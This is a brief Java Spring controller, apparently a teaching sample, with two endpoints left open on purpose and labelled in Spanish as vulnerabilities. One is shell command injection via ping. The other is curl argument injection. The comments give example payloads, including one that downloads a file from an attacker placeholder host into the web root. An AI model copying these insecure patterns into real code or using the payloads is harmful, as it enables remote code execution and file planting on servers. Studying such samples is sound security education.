import java.io.IOException;
import org.springframework.web.bind.annotation.*;

@RestController
public class ToolsController {

    // Vuln 1: se invoca la shell explicitamente
    @PostMapping("/ping")
    public String ping(@RequestParam String host) throws IOException {
        Process p = new ProcessBuilder("sh", "-c", "ping -c 1 " + host).start();   // host = "x; id"
        return new String(p.getInputStream().readAllBytes());
    }

    // Vuln 2: Runtime.exec(String) no usa shell, pero parte por espacios -> argument injection
    @GetMapping("/fetch")
    public String fetch(@RequestParam String url) throws IOException {
        Process p = Runtime.getRuntime().exec("curl -s " + url);   // url = "-o /app/static/x http://evil/x"
        return new String(p.getInputStream().readAllBytes());
    }
}
